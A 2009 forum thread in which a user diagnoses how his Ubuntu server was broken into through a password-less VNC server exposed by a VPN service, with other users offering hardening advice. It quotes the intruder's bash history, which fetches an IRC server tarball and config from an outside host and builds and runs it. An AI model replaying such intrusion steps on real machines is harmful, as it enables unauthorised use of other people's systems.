---
title: "I just got hacked, and I think I know how"
date: 2009-04-30
forum: Security
---

### Post by apanloco on 2009-04-30
I just got hacked. 

I was writing this enormous form post, with all details of my system setup and what I've found out, when it suddenly struck me: My server is connected through VPN tunnel (PPTP from "relakks.com") all the time which, if I now understand it correctly, opens up my machine wide open to the internet bypassing my router's firewall. And there my vino VNC server waves everybody in -- without a password. This is still just a theory, but I'm getting more and more confident that this is what happened.

UPDATE: I have now confirmed that I can connect to my servers "internal" password-less VNC server through the public IP I get from Relakks PPTP. Time to learn firewalling in Ubuntu.

I want to know what damage has been caused and how to proceed to make my server secure. So I will present everything I know.

Earlier today around 20:00 I happened to notice that cc1 was running, i.e. something is compiling something. I did get suspicious, but not suspicious enough. Two hours later I was installing llink and did a ps aux to see if it was running. I found ircd (or similar) in the process list. There I knew I had been hacked and disconnected the router. I saved the history and everything in /var/log/ to another machine where I'm typing now.

I did "history" very early and grepped for the process below. I found this:

```

464  apt-cache search sfv
465  sudo apt-get install cfv
466  cfv         <--- this is my last line, typed in a screen shell from my windows computer at home. I didn't log out.
467  ls          <--- this must be where he starts
468  cd /tmp
469  wget http://ircdshells.com..ar/servicios/Unreal3.2.7.tar.gz
470  uptime
471  wget http://ircdshells.com.ar/servicios/Unreal3.2.7.tar.gz
472  tar Unreal3.2.7.tar.gz
473  tar zxvf  Unreal3.2.7.tar.gz
474  cd Unreal3.2.7
475  ./Config
476  make
477  wget http://ircdshells.com.ar/tutoriales/configs/unrealircd3.2.7/unrealircd.conf
478  nano unrealircd.conf
479  ./unreal start
480  ./Config
481  make
482  ./unreal start
483  ./Config
484  make
485  ./unreal start
486  cd ..
487  ls
488  rm -rf Unreal3.2.7
489  tar Unreal3.2.7.tar.gz
490  tar zxvf Unreal3.2.7.tar.gz
491  cd Unreal3.2.7
492  ls
493  ./Config
494  make
495  ./unreal start
496  nano unrealircd.conf
497  wget http://ircdshells.com.ar/tutoriales/configs/unrealircd3.2.7/unrealircd.conf
498  nano unrealircd.conf
499  ./unreal start
500  exit
501  l     <--- this is where I start installing llink, in another shell, and later noticing the ircd server running.
502  tar zxvf llink-2.1.2-linux_x86.tar.gz 

```

So he used my account. Also notice that he does everything twice, probably due to a mistake in the configuration. I do not know how "history" puts together the log, but this is definetly from more than one shell, concatenated. 

this is the process list (there's "ircd" in the end, but there might be more that I havn't found :-/):

```

USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   3084   312 ?        Ss   08:37   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S<   08:37   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S<   08:37   0:00 [migration/0]
root         4  0.6  0.0      0     0 ?        S<   08:37   5:35 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   08:37   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S<   08:37   0:00 [migration/1]
root         7  0.0  0.0      0     0 ?        S<   08:37   0:04 [ksoftirqd/1]
root         8  0.0  0.0      0     0 ?        S<   08:37   0:00 [watchdog/1]
root         9  0.0  0.0      0     0 ?        D<   08:37   0:00 [events/0]
root        10  0.0  0.0      0     0 ?        S<   08:37   0:00 [events/1]
root        11  0.0  0.0      0     0 ?        S<   08:37   0:00 [khelper]
root        12  0.0  0.0      0     0 ?        S<   08:37   0:00 [kstop/0]
root        13  0.0  0.0      0     0 ?        S<   08:37   0:00 [kstop/1]
root        14  0.0  0.0      0     0 ?        S<   08:37   0:00 [kintegrityd/0]
root        15  0.0  0.0      0     0 ?        S<   08:37   0:00 [kintegrityd/1]
root        16  0.0  0.0      0     0 ?        S<   08:37   0:00 [kblockd/0]
root        17  0.0  0.0      0     0 ?        S<   08:37   0:00 [kblockd/1]
root        18  0.0  0.0      0     0 ?        S<   08:37   0:00 [kacpid]
root        19  0.0  0.0      0     0 ?        S<   08:37   0:00 [kacpi_notify]
root        20  0.0  0.0      0     0 ?        S<   08:37   0:00 [cqueue]
root        21  0.0  0.0      0     0 ?        S<   08:37   0:03 [ata/0]
root        22  0.0  0.0      0     0 ?        S<   08:37   0:00 [ata/1]
root        23  0.0  0.0      0     0 ?        S<   08:37   0:00 [ata_aux]
root        24  0.0  0.0      0     0 ?        S<   08:37   0:00 [ksuspend_usbd]
root        25  0.0  0.0      0     0 ?        S<   08:37   0:00 [khubd]
root        26  0.0  0.0      0     0 ?        S<   08:37   0:00 [kseriod]
root        27  0.0  0.0      0     0 ?        S<   08:37   0:00 [kmmcd]
root        28  0.0  0.0      0     0 ?        S<   08:37   0:00 [btaddconn]
root        29  0.0  0.0      0     0 ?        S<   08:37   0:00 [btdelconn]
root        32  0.0  0.0      0     0 ?        S<   08:37   0:25 [kswapd0]
root        33  0.0  0.0      0     0 ?        S<   08:37   0:00 [aio/0]
root        34  0.0  0.0      0     0 ?        S<   08:37   0:00 [aio/1]
root        35  0.0  0.0      0     0 ?        S<   08:37   0:00 [ecryptfs-kthrea]
root        38  0.0  0.0      0     0 ?        S<   08:37   0:00 [scsi_eh_0]
root        39  0.0  0.0      0     0 ?        S<   08:37   0:00 [scsi_eh_1]
root        40  0.0  0.0      0     0 ?        S<   08:37   0:00 [scsi_eh_2]
root        41  0.0  0.0      0     0 ?        S<   08:37   0:00 [scsi_eh_3]
root        42  0.0  0.0      0     0 ?        S<   08:37   0:00 [scsi_eh_4]
root        43  0.0  0.0      0     0 ?        S<   08:37   0:00 [scsi_eh_5]
root        44  0.0  0.0      0     0 ?        S<   08:37   0:05 [scsi_eh_6]
root        45  0.0  0.0      0     0 ?        S<   08:37   0:00 [scsi_eh_7]
root        46  0.0  0.0      0     0 ?        S<   08:37   0:00 [kstriped]
root        47  0.0  0.0      0     0 ?        S<   08:37   0:00 [kmpathd/0]
root        48  0.0  0.0      0     0 ?        S<   08:37   0:00 [kmpathd/1]
root        49  0.0  0.0      0     0 ?        S<   08:37   0:00 [kmpath_handlerd]
root        50  0.0  0.0      0     0 ?        S<   08:37   0:00 [ksnapd]
root        51  0.0  0.0      0     0 ?        S<   08:37   0:00 [kondemand/0]
root        52  0.0  0.0      0     0 ?        S<   08:37   0:00 [kondemand/1]
root        53  0.0  0.0      0     0 ?        S<   08:37   0:00 [krfcommd]
root       782  0.0  0.0      0     0 ?        S<   08:37   0:01 [kjournald]
root       920  0.0  0.0   2372   312 ?        S<s  08:37   0:00 /sbin/udevd --daemon
ntp       1513  0.0  0.1   4360  1324 ?        Ss   23:18   0:00 /usr/sbin/ntpd -p /var/run/ntpd.pid -u 112:122 -g
root      1519  0.0  0.3  13232  3336 ?        S    23:18   0:00 /usr/sbin/smbd -D
root      1529  0.0  0.2   8512  2952 ?        Ss   23:18   0:00 sshd: da [priv]  
da        1537  0.0  0.1   8512  1588 ?        S    23:18   0:00 sshd: da@pts/1   
da        1538  0.0  0.1   4168  1120 pts/1    Ss+  23:18   0:00 /usr/bin/screen.real -c /home/da/.screen-profiles/profile -D -R work
root      1628  0.0  0.0      0     0 ?        S<   08:37   0:00 [kpsmoused]
root      2128  0.0  0.0      0     0 ?        S<   08:37   0:00 [xfs_mru_cache]
root      2129  0.0  0.0      0     0 ?        S<   08:37   0:00 [xfslogd/0]
root      2130  0.0  0.0      0     0 ?        S<   08:37   0:00 [xfslogd/1]
root      2131  0.0  0.0      0     0 ?        S<   08:37   0:05 [xfsdatad/0]
root      2132  0.0  0.0      0     0 ?        S<   08:37   0:00 [xfsdatad/1]
root      2133  0.0  0.0      0     0 ?        S<   08:37   0:00 [xfsbufd]
root      2140  0.0  0.0      0     0 ?        S<   08:37   0:00 [xfsaild]
root      2141  0.0  0.0      0     0 ?        S<   08:37   0:00 [xfssyncd]
root      2142  0.0  0.0      0     0 ?        S<   08:37   0:12 [loop0]
root      2143  0.0  0.0      0     0 ?        S<   08:37   0:02 [kjournald]
da        2267  0.0  0.1   2768  1032 pts/5    R+   23:19   0:00 ps aux
root      2409  0.0  0.0   1808   224 tty4     Ss+  08:37   0:00 /sbin/getty 38400 tty4
root      2410  0.0  0.0   1808   224 tty5     Ss+  08:37   0:00 /sbin/getty 38400 tty5
root      2416  0.0  0.0   1808   224 tty2     Ss+  08:37   0:00 /sbin/getty 38400 tty2
root      2417  0.0  0.0   1808   224 tty3     Ss+  08:37   0:00 /sbin/getty 38400 tty3
root      2418  0.0  0.0   1808   224 tty6     Ss+  08:37   0:00 /sbin/getty 38400 tty6
root      2489  0.0  0.0   2204   304 ?        Ss   08:37   0:00 /usr/sbin/acpid -c /etc/acpi/events -s /var/run/acpid.socket
syslog    2567  0.0  0.0   2040   372 ?        Ss   08:37   0:00 /sbin/syslogd -u syslog
root      2590  0.0  0.0   1968   200 ?        S    08:37   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
klog      2592  0.0  0.2   4460  2504 ?        Ss   08:37   0:00 /sbin/klogd -P /var/run/klogd/kmsg
106       2615  0.0  0.1   3832  2012 ?        Ss   08:37   0:03 /bin/dbus-daemon --system
root      2653  0.0  0.0   5436   768 ?        Ss   08:37   0:00 /usr/sbin/sshd
root      2712  0.0  0.0   1872   236 ?        S    08:37   0:00 /bin/sh /usr/bin/mysqld_safe
da        3091  0.0  0.3   6616  3368 pts/7    Ss+  19:41   0:00 /bin/bash
root      3205  0.0  0.0   1656   200 ?        S    08:37   0:00 /sbin/tuncfg
root      3209  0.0  0.3  19372  3968 ?        Ssl  08:37   0:03 /usr/sbin/console-kit-daemon
da        3289  0.0  0.0   3212   668 ?        S    08:37   0:16 hamachi start
root      3364  0.0  0.1   7248  1244 ?        Ss   08:37   0:00 /usr/sbin/nmbd -D
root      3368  0.0  0.1  12980  1468 ?        Ss   08:37   0:00 /usr/sbin/smbd -D
root      3392  0.0  0.0  12980   932 ?        S    08:37   0:00 /usr/sbin/smbd -D
109       3421  0.0  0.1   6876  2020 ?        Ss   08:37   0:08 /usr/sbin/hald
root      3422  0.0  0.0   3328   780 ?        S    08:37   0:00 hald-runner
root      3451  0.0  0.0   5176   532 ?        S    08:37   0:00 hald-addon-input: Listening on /dev/input/event1 /dev/input/event0 /dev/input/event3 /dev/input/event5
root      3506  0.0  0.0   5180   696 ?        S    08:37   0:06 hald-addon-storage: polling /dev/sr0 (every 2 sec)
109       3508  0.0  0.0   5032   524 ?        S    08:37   0:00 hald-addon-acpi: listening on acpid socket /var/run/acpid.socket
mythtv    3535  1.1  1.3 267764 14012 ?        Ssl  08:37   9:46 /usr/bin/mythbackend --daemon --logfile /var/log/mythtv/mythbackend.log --pidfile /var/run/mythtv/mythbackend.pid
root      3556  0.0  0.1  15032  1076 ?        Ss   08:37   0:00 /usr/sbin/gdm
root      3559  0.0  0.1  15556  1192 ?        S    08:37   0:00 /usr/sbin/gdm
root      3563  1.2 13.1 168380 134812 tty7    Ss+  08:37  10:55 /usr/X11R6/bin/X :0 -br -audit 0 -auth /var/lib/gdm/:0.Xauth -nolisten tcp vt7
root      3592  0.0  0.2  16512  2120 ?        Ssl  08:37   0:00 /usr/sbin/NetworkManager --pid-file /var/run/NetworkManager/NetworkManager.pid
avahi     3612  0.0  0.0   3056   968 ?        Ss   08:37   0:00 avahi-daemon: running [brutus.local]
avahi     3613  0.0  0.0   2944   172 ?        Ss   08:37   0:00 avahi-daemon: chroot helper
root      3615  0.0  0.0   4276   272 ?        S    08:37   0:00 /sbin/wpa_supplicant -u -f /var/log/wpa_supplicant.log
root      3617  0.0  0.1   7064  1232 ?        S    08:37   0:00 /usr/sbin/nm-system-settings --config /etc/NetworkManager/nm-system-settings.conf
root      3640  0.0  0.0      0     0 ?        S<   08:37   0:00 [kdvb-ad-0-fe-0]
root      3641  0.0  0.0   6104  1004 ?        Ss   08:37   0:00 /usr/sbin/cupsd
root      3649  0.0  0.0      0     0 ?        S<   08:37   0:00 [kdvb-ad-1-fe-0]
root      3677  0.0  0.0   4324   324 ?        Ss   08:37   0:00 /usr/bin/system-tools-backends
root      3749  0.0  0.0   3116   368 ?        S<s  08:37   0:00 /usr/sbin/lircd --device=/dev/lirc0
daemon    3821  0.0  0.0   2096   232 ?        Ss   08:37   0:00 /usr/sbin/atd
root      3849  0.0  0.0   3480   400 ?        Ss   08:37   0:00 /usr/sbin/cron
da        3893  0.0  0.1  26460  1996 ?        Ssl  08:37   0:00 x-session-manager
root      4060  0.0  0.0   1808   288 tty1     Ss+  08:37   0:00 /sbin/getty 38400 tty1
mysql     4084  0.2  1.5 131180 16220 ?        Sl   08:37   2:16 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/mysqld.sock
root      4085  0.0  0.0   1792   256 ?        S    08:37   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
da        4136  0.0  0.0   4784   424 ?        Ss   08:37   0:00 /usr/bin/ssh-agent /usr/bin/dbus-launch --exit-with-session /usr/bin/seahorse-agent --execute x-session-manager
da        4142  0.0  0.0   3144   280 ?        S    08:37   0:00 /usr/bin/dbus-launch --exit-with-session /usr/bin/seahorse-agent --execute x-session-manager
da        4178  0.0  0.1   3068  1076 ?        Ss   08:37   0:00 //bin/dbus-daemon --fork --print-pid 6 --print-address 9 --session
da        4244  0.0  0.1  19208  1560 ?        Ss   08:37   0:00 /usr/bin/seahorse-agent --execute x-session-manager
da        4247  0.0  0.2   7620  2080 ?        S    08:37   0:00 /usr/lib/libgconf2-4/gconfd-2
da        4250  0.0  0.0   5616   884 ?        S    08:37   0:00 /usr/lib/gvfs/gvfsd
da        4257  0.0  0.0  29584   700 ?        Ssl  08:37   0:00 /usr/lib/gvfs//gvfs-fuse-daemon /home/da/.gvfs
da        4265  0.0  0.2  29228  2364 ?        Ssl  08:37   0:00 /usr/lib/gnome-settings-daemon/gnome-settings-daemon
da        4266  0.0  0.0  25668  1024 ?        SL   08:37   0:00 gnome-keyring-daemon --start
da        4271  0.0  0.5  22512  5828 ?        S    08:37   0:00 metacity
da        4272  0.0  0.9  37828  9492 ?        S    08:37   0:18 gnome-panel
da        4273  0.0  0.5  56472  6128 ?        S    08:38   0:01 nautilus
da        4275  0.0  0.0  33572   568 ?        Ssl  08:38   0:00 /usr/lib/bonobo-activation/bonobo-activation-server --ac-activate --ior-output-fd=18
da        4277  0.0  0.1  34552  2032 ?        Sl   08:38   0:00 /usr/lib/evolution/2.26/evolution-alarm-notify
da        4278  0.0  0.3  20460  3452 ?        S    08:38   0:00 bluetooth-applet
da        4281  0.0  0.2  28040  2576 ?        S    08:38   0:01 update-notifier --startup-delay=60
da        4282  0.0  0.1  28124  1808 ?        S    08:38   0:00 /usr/lib/tracker/trackerd
da        4285  0.0  0.7  34932  7264 ?        Sl   08:38   0:00 nm-applet --sm-disable
da        4307  1.1  0.3  25516  4068 ?        S    08:38   9:59 /usr/lib/vino/vino-server
da        4309  0.0  0.2  27816  2084 ?        S    08:38   0:00 python /usr/share/system-config-printer/applet.py
da        4312  0.0  0.1  19012  1288 ?        S    08:38   0:00 tracker-applet
da        4315  0.0  0.7  23244  7796 ?        S    08:38   0:00 /usr/lib/notify-osd/notify-osd
da        4325  0.0  0.1  24744  1856 ?        Ss   08:38   0:00 gnome-power-manager
da        4328  0.0  0.5  60400  5800 ?        Sl   08:38   0:00 ruby /home/da/coding/wifeypopup/wifeypopup.rb
da        4337  0.0  0.1   5940  1208 ?        S    08:38   0:23 /usr/lib/gvfs/gvfsd-trash --spawner :1.4 /org/gtk/gvfs/exec_spaw/0
da        4347  0.0  0.3  23904  3492 ?        S    08:38   0:00 /usr/lib/gnome-applets/trashapplet --oaf-activate-iid=OAFIID:GNOME_Panel_TrashApplet_Factory --oaf-ior-fd=18
da        4350  0.0  0.1  25360  1628 ?        S    08:38   0:00 /usr/lib/gvfs/gvfs-hal-volume-monitor
da        4354  0.0  0.0   8320   908 ?        S    08:38   0:00 /usr/lib/gvfs/gvfs-gphoto2-volume-monitor
da        4360  0.0  0.0   5616   568 ?        S    08:38   0:00 /usr/lib/gvfs/gvfsd-burn --spawner :1.4 /org/gtk/gvfs/exec_spaw/1
da        4364  0.0  0.4  44584  4352 ?        Sl   08:38   0:00 /usr/lib/gnome-applets/mixer_applet2 --oaf-activate-iid=OAFIID:GNOME_MixerApplet_Factory --oaf-ior-fd=19
da        4367  0.0  0.3  23984  4048 ?        S    08:38   0:01 /usr/lib/indicator-applet/indicator-applet --oaf-activate-iid=OAFIID:GNOME_IndicatorApplet_Factory --oaf-ior-fd=26
da        4383  0.0  0.1  28480  1808 ?        SN   08:38   0:00 /usr/lib/tracker/tracker-indexer
da        4401  0.0  0.1  16636  1440 ?        Ss   08:38   0:03 gnome-screensaver
da        7154  0.0  0.3   6608  3300 pts/6    Ss+  19:22   0:00 /bin/bash
da        9942  0.0  0.3   6608  3304 pts/8    Ss+  19:41   0:00 /bin/bash
da       10358 12.4 14.8 280804 152088 ?       Sl   22:10   8:38 /usr/bin/mythfrontend.real
da       10682  0.1  2.5  29008 25696 ?        Ss   11:19   1:16 /usr/bin/SCREEN.real -c /home/da/.screen-profiles/profile -D -R work
root     12681  0.0  0.6  13616  6500 ?        S    19:43   0:00 /usr/bin/python /usr/lib/system-service/system-service-d
da       12713  0.0  3.9  85844 40196 ?        SN   19:43   0:03 /usr/bin/python2.6 /usr/bin/update-manager --no-focus-on-map
root     12720  0.0  0.0      0     0 ?        S    22:13   0:00 [pdflush]
root     12794  0.0  0.0      0     0 ?        S    22:13   0:00 [pdflush]
da       12954  0.0  0.2   6608  2752 pts/4    Ss   11:56   0:00 /bin/bash
da       13457  0.0  0.3   6616  3868 pts/0    Ss+  22:13   0:00 /bin/bash
da       13926  0.0  0.3   6608  3268 pts/9    Ss+  19:44   0:00 /bin/bash
da       15372  0.0  0.0   1256   296 pts/0    S    22:15   0:00 ./llink
da       15374  0.0  0.0   1256   584 ?        Ss   22:15   0:00 ./llink
da       29148  0.0  0.3   6616  3588 pts/5    Ss   18:02   0:00 /bin/bash
da       30735  0.0  0.1   4184  1908 ?        S    19:58   0:00 /tmp/Unreal3.2.7/src/ircd 


```

So he started the server at 19:58. At the time it happened there is a quite many of lines like these in the syslog:

```

Apr 30 20:06:20 brutus kernel: [41357.888050] TCP: Treason uncloaked! Peer 89.128.151.159:6888/56192 shrinks window 1578177162:1578177369. Repaired.

```

nmap says this now:

```


da@brutus:~$ nmap -v -v -p 0- 127.0.0.1

Starting Nmap 4.76 ( http://nmap.org ) at 2009-04-30 23:36 CEST
... [cut]
Interesting ports on brutus (127.0.0.1):
Not shown: 65521 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
631/tcp  open  ipp
3306/tcp open  mysql
5900/tcp open  vnc   <-- THIS IS PASSWORD-LESS RIGHT NOW
6543/tcp open  mythtv
6544/tcp open  mythtv
6547/tcp open  powerchuteplus
6667/tcp open  irc
6668/tcp open  irc
7000/tcp open  afs3-fileserver
7004/tcp open  afs3-kaserver
8001/tcp open  unknown
8067/tcp open  unknown

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
da@brutus:~$


```

I do not know what some of these services are, especially the last two.

The server is connected through Relakks.com PPTP, mostly, connecting through gnome network manager. So, could someone malicous get through to "internal" services running on the server, even though I have a router that hasn't opened the ports? In that case I have an fully open password-less VNC connection to my machine. Catastrophy. Then this must be it. Is there a way to list previous incoming VNC connections in Gnome? I'd like to know for sure...

These are the "last" records:

```

da       pts/2        Thu Apr 30 23:23   still logged in    :0.0
da       pts/1        Thu Apr 30 23:18   still logged in    192.168.1.3
guest    pts/1        Thu Apr 30 22:43 - 22:43  (00:00)     192.168.1.3  <-- me trying the guest login to see if that could be it
guest    pts/1        Thu Apr 30 22:42 - 22:42  (00:00)     192.168.1.3
da       pts/2        Thu Apr 30 18:01 - 23:23  (05:21)     192.168.1.3
da       pts/2        Thu Apr 30 11:19 - 11:57  (00:37)     192.168.1.3
da       pts/0        Thu Apr 30 11:19 - 20:11  (08:51)     :0.0
da       tty7         Thu Apr 30 08:37   still logged in    :0
reboot   system boot  Thu Apr 30 08:37 - 23:54  (15:17)     2.6.28-11-generic

```

192.168.1.3 is my windows machine that often connects to this server. So, there are no logins at that time. I actually think I had a console running on the x-server, but it is not there now, probably due to the "exit" in the end in the history.

If someone has any suggestions how to move forward, *please* share. I do not know how to do some kind of damage assessment. If I am lucky, he just started this server and no-one has done anything. "history" doesn't seem to save much. The might be some other kind of backdoor already present that he used. Any hints appreciated. I'm happy to share more information if anyone wants to help.

EDIT: By mistake I wrote VPN instead of VNC which probably confused everybody reading this. Fixed.

/Apan

---

### Post by Techproof on 2009-04-30
If your running your server through a VPN and it got hacked then that VPN isn't a VPN as the abbreviation for a VPN is Virtual PRIVATE network. 

What processes from the list do you not know are for and I can see if I can help with that, I'm a bit confused as to how you have drawn up your theory of being hacked. Looking through the info you have already provided I cant see anything that looks like a scripted attack although I will admit there are some strange processes being performed. 

Is the machine still disconnected from your network, what ports where set on your router to allow access to the machine? Have you had anything like this happen before? Does your router have any logs that may help such as activity reports?

I will help where I can but I'm more of a Network/Internet Techie than a Ubuntu techie at the moment.

---

### Post by apanloco on 2009-04-30
Thanks for the reply. I got my theory when reading the FAQ on relakks.com here:

[https://www.relakks.com/faq/qna/](https://www.relakks.com/faq/qna/)

> 
Security
Q: Do I need a special type of firewall when I use Relakks Safe Surf?
A: If you have a router and has been using its built in firewall we recommend that you install a software firewall when using Relakks Safe Surf. As it is, the hardware firewall in your router can't scan the traffic running through a VPN-tunnel such as the one our Relakks Safe Surf service is using.


My interpretation of the above is that the router's firewall is bypassed when using Relakks PPTP.

The machine is disconnected and it will be 'till I know what happened or it is wiped, preferably the former.

I have looked through the process list and haven't found anything suspicious myself, except for the IRC server. I guess if I have a backdoor it would go under a known process name or (more likely) hide itself.

Thanks again,
/A

---

### Post by apanloco on 2009-04-30
I have now confirmed that when I go online with Relakks PPTP on my Ubuntu server I can connect to the VNC through the **public** Relakks IP from another computer. With no password. Scary. I am now learning "ufw" after googling a bit on ubuntu and firewalls.

/A

---

### Post by Techproof on 2009-04-30
Looking through the faq you posted I found this: -

"Q: Is my connection protected?
A: Yes, every connection has 128-bits encryption"

It does not sound logical that the hack came from the direct connection to them so it may be worth checking for other possible entries 

A bit of digging around through google searches and some of the related articles on this subject also states many concerns over spoofed packets and security whilst using PPTP but most of this is gripe against microsoft and thus not very useful to you.

It may be best to consult directly with relakks as they may have a set procedure to ensure maximum security on connections.

With regards to any damage being done your history logs should show the locations of files that were modified therefore you should be able to go through the history erasing/repairing these files if you know what to look for. It looks like a painfully tedious job especially as you will need to know how to spot what was modified if anything was modified at all. 

On basic security, I would strongly recommend changing the password for your user name and if you feel the need the root user as well (if you have assigned a password for root instead of using "sudo") 

I cant think of much more to suggest however I hope you manage to resolve the issue without too much grief.

Let me know how you get on. 
:)

---

### Post by apanloco on 2009-04-30
We wrote at the same time! :-) I have now confirmed that you can reach private internal services using the public Relakks PPTP IP. I put the computer online for a few minutes, just to try. I connected to Relakks PPTP, and checked my Relakks IP. Then went over to another computer and connected to the VNC server using this new IP. The desktop just popped right up.

---

### Post by Techproof on 2009-04-30
That doesn't sound right, definitely try to contact a technical advisor at Relakk as their FAQ along with your findings don't match up. Haven't had much joy finding more info for you it seems that this subject is prime for picking holes in Microsoft but nothing actually helpful on the subject.

Im not too familiar with Relakk or the back end workings of PPTP but Im used to looking at security over the internet so I hope what little insight ive provided helps. 

Definalty find an email contact for them as this doesn't add up to what they are saying.

keep me posted!!

---

### Post by apanloco on 2009-04-30
More proof: 

> 
10. You should now disable "File and Printer Sharing" as it can pose as a security issue.


[https://www.relakks.com/faq/guides/connectionxp/](https://www.relakks.com/faq/guides/connectionxp/)

I feel quite dumb now that I didn't put the pieces together earlier. What a big security risk.

Regarding what you said. That the connection is encrypted does not contradict anything IMO. You get a new public IP with Relakks. Everything from this IP to your computer is encrypted, so no-one can analyze the traffic. Your machine is reachable from the the new public IP you get. Otherwise you wouldn't be able to surf. 

When I type "history" I only get very little history. How do I get _all_ bash history?

---

### Post by apanloco on 2009-04-30
I have now emailed the Relakks support regarding this. I will post an update as soon as I get a response.

But as it looks now, someone found my open VNC connection. Just connected. Clumsy and manually installed an IRC server using the already open gnome-terminal. And then left.

I'm quite confident nothing else happened. And for this I also feel lucky. Oh the damage he could have done.

Thanks Techproof for sticking with me :-)

PS: For anyone wanting to know what his unrealircd.conf looked like, maybe seeing which server he wanted to connect to, I put it on pastebin:
[http://pastebin.com/m36f4467a](http://pastebin.com/m36f4467a)

And this is the diff from the one he downloaded. Not much changed, I wonder if it was even yet functioning as planned.
[http://pastebin.com/m3b889b92](http://pastebin.com/m3b889b92)

BR/Apan

---

### Post by The Cog on 2009-05-01
My understanding from a quick look at their site is that they give you a publicy visible IP address. You can connect to the internet from this IP address (presumably anonymously), but of course the rest of the internet can connect to you on that address too. The encryption simply ensures that your connection to their site using your real IP address cannot be eavesdropped to find out what you are doing. It does nothing to protect the public IP address that they have assigned to you.

---

### Post by movieman on 2009-05-02
In either case, if you want security then VNC should always be configured with a password and only accessible from localhost: then forward it over ssh to your remote machine when you want to use it.

---

### Post by The Cog on 2009-05-03
> **movieman said:**
> in either case, if you want security then vnc should always be configured with a password and only accessible from localhost: Then forward it over ssh to your remote machine when you want to use it.

+1

---

